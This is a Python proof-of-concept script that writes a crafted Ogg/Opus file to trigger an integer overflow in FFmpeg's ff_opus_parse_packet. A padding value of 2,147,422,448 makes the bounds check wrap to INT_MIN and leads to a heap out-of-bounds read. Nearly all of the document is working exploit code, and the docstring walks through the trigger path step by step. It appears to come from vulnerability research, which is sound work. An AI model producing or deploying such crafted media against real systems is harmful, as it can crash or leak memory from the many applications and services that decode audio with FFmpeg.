#!/usr/bin/env python3
"""
PoC generator for VULN 001:
  Integer overflow in ff_opus_parse_packet() → heap OOB read

Vulnerability: libavcodec/opus/parse.c, lines 223-228 (CBR self-delimiting path):

    frame_bytes = xiph_lacing_16bit(&ptr, end);
    if (frame_bytes < 0 || pkt->frame_count * frame_bytes + padding > end - ptr)
        goto fail;
    end      = ptr + pkt->frame_count * frame_bytes + padding;
    buf_size = end - buf;

With frame_count=48, frame_bytes=1275, padding=2,147,422,448:
  48*1275 + 2,147,422,448 = 2,147,483,648  (= INT_MAX+1 → wraps to INT_MIN = -2,147,483,648)
The bounds check -2,147,483,648 > 61200 evaluates False, so no goto fail.
Then end = ptr + INT_MIN, pointing ~2 GB before buf.
buf_size = end - buf = large negative integer.
pkt->packet_size = buf_size (corrupted).

Back in dec.c:590:
    buf += s->packet.packet_size;   // advances buf by ~-2GB (backward)
Then ff_opus_parse_packet for stream 1 reads from the corrupted buf → OOB/crash.

Trigger path:
  ffmpeg -i crafted.ogg -f null -
  → Ogg demuxer → OpusDec → ff_opus_parse_packet (stream 0, self_delimiting=1) → overflow
  → dec.c:590 corrupts buf → ff_opus_parse_packet (stream 1) → OOB read
"""

import struct
import sys
import os

# ---------------------------------------------------------------------------
# Ogg utilities
# ---------------------------------------------------------------------------

def ogg_crc32(data):
    """Compute Ogg-specific CRC32 with polynomial 0x04c11db7."""
    crc_table = []
    for i in range(256):
        r = i << 24
        for _ in range(8):
            if r & 0x80000000:
                r = (r << 1) ^ 0x04c11db7
            else:
                r <<= 1
            r &= 0xFFFFFFFF
        crc_table.append(r)

    crc = 0
    for b in data:
        crc = ((crc << 8) & 0xFFFFFFFF) ^ crc_table[((crc >> 24) & 0xFF) ^ b]
    return crc


def make_ogg_page(header_type, granule_pos, serial, seq_no, segments, data):
    """
    Construct a single Ogg page with CRC.

    Ogg page layout (all little-endian):
      capture_pattern[4]  = "OggS"
      stream_structure_version[1] = 0
      header_type_flag[1]
      absolute_granule_position[8]
      stream_serial_number[4]
      page_sequence_no[4]
      page_checksum[4]      (zeroed during CRC computation)
      page_segments[1]
      segment_table[page_segments]
      data[sum(segment_table)]
    """
    assert len(segments) <= 255
    assert sum(s for s in segments) == len(data), \
        f"segment sum {sum(segments)} != data len {len(data)}"

    hdr = struct.pack('<4sBBQIII',
        b'OggS',
        0,
        header_type,
        granule_pos & 0xFFFFFFFFFFFFFFFF,
        serial,
        seq_no,
        0,   # checksum placeholder (zeroed for CRC computation)
    )
    hdr += bytes([len(segments)]) + bytes(segments)
    page = hdr + bytes(data)
    crc = ogg_crc32(page)
    # Patch checksum bytes at offset 22-25
    page = page[:22] + struct.pack('<I', crc) + page[26:]
    return page


def packet_to_pages(packet_data, serial, start_seq,
                    first_ht=0x00, last_granule=0, eos=False):
    """
    Split a logical Ogg packet into one or more Ogg pages.

    Ogg packet framing rules:
    - A packet ends when a segment with size < 255 is encountered.
    - If all segments on a page are 255 bytes, the packet continues on the next page.
    - A continuation page has header_type bit 0 set.

    Each page holds up to 255 segments × 255 bytes = 65,025 bytes.

    Returns (pages_bytes, next_seq_no).
    """
    pages = b''
    pos = 0
    seq = start_seq
    total = len(packet_data)
    MAX_PAGE_DATA = 255 * 255  # 65,025

    while pos < total:
        chunk = packet_data[pos:pos + MAX_PAGE_DATA]
        n = len(chunk)

        # Build segment table for this chunk
        segs = []
        rem = n
        while rem > 0:
            s = min(255, rem)
            segs.append(s)
            rem -= s

        is_first_page = (pos == 0)
        is_last_page = (pos + n >= total)

        # If this is the last page and the last segment is exactly 255,
        # the decoder would think the packet continues. Add a 0-byte segment
        # to properly terminate it.
        if is_last_page and segs and segs[-1] == 255:
            segs.append(0)

        # Header type
        ht = first_ht if is_first_page else 0x01  # 0x01 = packet continuation
        if is_last_page and eos:
            ht |= 0x04  # EOS flag

        # Granule position: -1 (intermediate) except on the last page
        gp = last_granule if is_last_page else 0xFFFFFFFFFFFFFFFF

        pages += make_ogg_page(ht, gp, serial, seq, segs, chunk)
        seq += 1
        pos += n

    return pages, seq


# ---------------------------------------------------------------------------
# Opus header/tag builders
# ---------------------------------------------------------------------------

def make_opus_head(channel_count, stream_count, coupled_count,
                   channel_mapping, pre_skip=312):
    """
    Build an OpusHead packet (RFC 7845 §5.1).

    For channel_mapping_family=1:
      Total channels = 2*coupled_count + (stream_count - coupled_count)
    With stream_count=2, coupled_count=0: 2 mono streams → 2 channels.
    nb_streams=2 causes ff_opus_parse_extradata to set nb_streams=2,
    which makes dec.c:501 call ff_opus_parse_packet with self_delimiting=1.
    """
    d = b'OpusHead'
    d += struct.pack('<BB', 1, channel_count)   # version=1, channel_count
    d += struct.pack('<H', pre_skip)            # pre_skip
    d += struct.pack('<I', 48000)               # input_sample_rate
    d += struct.pack('<h', 0)                   # output_gain
    d += struct.pack('<B', 1)                   # channel_mapping_family=1
    d += struct.pack('<BB', stream_count, coupled_count)
    d += bytes(channel_mapping)
    return d


def make_opus_tags():
    """Build a minimal OpusTags packet (RFC 7845 §5.2)."""
    vendor = b'PoC-VULN001'
    d = b'OpusTags'
    d += struct.pack('<I', len(vendor)) + vendor
    d += struct.pack('<I', 0)   # user_comment_list_length = 0
    return d


# ---------------------------------------------------------------------------
# Crafted Opus packet
# ---------------------------------------------------------------------------

def xiph_lacing_encode_full(value):
    """
    Encode `value` using Xiph full lacing (for code=3 packet padding size).

    Encoding: each 0xFF byte nets +254 in the decoder
              (val += 255, then val-- = net +254)
              the final byte (< 255) adds its value directly.

    So:  value = n * 254 + f
         n = value // 254   (number of 0xFF bytes)
         f = value % 254    (final byte, always 0-253 < 255)

    The decoder check `val > INT_MAX - 254` fires only when
    val > 2,147,483,393, which requires n > 8,454,659.
    Our n = 2,147,422,448 // 254 = 8,454,419 is well within bounds.
    """
    n = value // 254
    f = value % 254
    # Sanity check
    assert n * 254 + f == value
    assert 0 <= f <= 253
    return bytes([0xFF] * n) + bytes([f])


def make_crafted_opus_packet():
    """
    Build the crafted Opus packet that triggers the overflow in parse.c:225.

    Packet layout:
      [0]   TOC byte         = 0x83  (config=16 CELT-NB-2.5ms, stereo=0, code=3)
      [1]   count byte       = 0x70  (VBR=0 CBR, padding=1, frame_count=48)
      [2..] padding lacing   = Xiph encoding of 2,147,422,448
      [..]  frame_bytes_enc  = [0xFF, 0xFF]  (= 1275 via xiph_lacing_16bit)
      [..]  frame data       = 48 × 1275 bytes of 0x00

    Overflow calculation (parse.c:225, all int32 arithmetic):
      frame_count * frame_bytes + padding
      = 48 * 1275 + 2,147,422,448
      = 61,200  + 2,147,422,448
      = 2,147,483,648       ← exceeds INT_MAX (2,147,483,647)
      → wraps to INT_MIN  = -2,147,483,648  (signed two's complement)

    Bounds check: -2,147,483,648 > 61,200  → False  → does NOT goto fail

    Result:
      end = ptr + (-2,147,483,648)    ~2 GB before ptr
      buf_size = end - buf            large negative int
      pkt->packet_size = buf_size     corrupted

    Config=16 (CELT NB 2.5ms) with 48 frames:
      frame_duration[16] = 120 samples
      120 * 48 = 5760 = OPUS_MAX_PACKET_DUR  → NOT > 5760 → passes duration check ✓
    """
    # TOC: config=16 (bits 7-3), stereo=0 (bit 2), code=3 (bits 1-0)
    # (16 << 3) | (0 << 2) | 3 = 128 | 0 | 3 = 0x83
    toc = 0x83

    # Count byte: VBR=0 (bit 7), padding=1 (bit 6), frame_count=48 (bits 5-0)
    # 0x00 | 0x40 | 0x30 = 0x70
    frame_count = 48
    count_byte = 0x40 | frame_count   # = 0x70

    # Padding value that causes the overflow
    # We need: frame_count * frame_bytes + padding_value to overflow int32
    # frame_count=48, frame_bytes=1275 → 48*1275 = 61200
    # 61200 + padding_value must wrap:  61200 + 2,147,422,448 = 2,147,483,648 (INT_MAX+1)
    padding_value = 2147422448
    padding_lacing = xiph_lacing_encode_full(padding_value)

    # CBR frame_bytes = 1275 encoded via xiph_lacing_16bit:
    # first byte >= 252 → val = first_byte + 4 * second_byte
    # 0xFF = 255,  255 + 4*255 = 255 + 1020 = 1275  ✓  (= OPUS_MAX_FRAME_SIZE)
    frame_bytes_enc = bytes([0xFF, 0xFF])

    # Frame data: 48 * 1275 = 61,200 bytes of zeros
    frame_data = bytes(frame_count * 1275)

    packet = bytes([toc, count_byte]) + padding_lacing + frame_bytes_enc + frame_data
    return packet


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    outdir = os.path.dirname(os.path.abspath(__file__))
    output_file = os.path.join(outdir, 'vuln_001_input.ogg')
    serial = 0x12345678

    print('[*] Building crafted Opus packet...', file=sys.stderr)
    audio_packet = make_crafted_opus_packet()
    print(f'[*] Audio packet size: {len(audio_packet):,} bytes '
          f'(~{len(audio_packet)/1024/1024:.1f} MB)', file=sys.stderr)

    # Verify overflow: 48*1275 + 2,147,422,448 must wrap to negative in int32
    expected_sum = (48 * 1275 + 2147422448) & 0xFFFFFFFF
    if expected_sum & 0x80000000:
        signed = expected_sum - 0x100000000
    else:
        signed = expected_sum
    print(f'[*] Overflow check: 48*1275 + 2147422448 = {signed} (should be negative)', file=sys.stderr)
    assert signed < 0, "Overflow did not occur! Adjust padding_value."

    # Channel mapping: family=1, stream_count=2 (both mono), coupled_count=0
    # Total channels = 2*0 + (2-0) = 2  ✓
    # nb_streams=2 → self_delimiting=1 for stream 0 in dec.c:501
    seq = 0
    channel_count = 2
    stream_count = 2
    coupled_count = 0
    channel_mapping = [0, 1]

    print('[*] Building Ogg file...', file=sys.stderr)

    # OpusHead BOS page
    head_data = make_opus_head(channel_count, stream_count, coupled_count, channel_mapping)
    head_pages, seq = packet_to_pages(head_data, serial, seq, first_ht=0x02, last_granule=0)

    # OpusTags page
    tags_data = make_opus_tags()
    tags_pages, seq = packet_to_pages(tags_data, serial, seq, first_ht=0x00, last_granule=0)

    # Crafted audio packet (may span many pages)
    # granule_pos = 5760 (one max-duration Opus packet worth of samples)
    audio_pages, seq = packet_to_pages(
        audio_packet, serial, seq,
        first_ht=0x00, last_granule=5760, eos=True
    )

    total_size = len(head_pages) + len(tags_pages) + len(audio_pages)
    print(f'[*] Total Ogg file size: {total_size:,} bytes '
          f'(~{total_size/1024/1024:.1f} MB)', file=sys.stderr)
    print(f'[*] Number of audio pages: {seq - 2}', file=sys.stderr)

    with open(output_file, 'wb') as f:
        f.write(head_pages)
        f.write(tags_pages)
        f.write(audio_pages)

    print(f'[+] Written: {output_file}', file=sys.stderr)


if __name__ == '__main__':
    main()
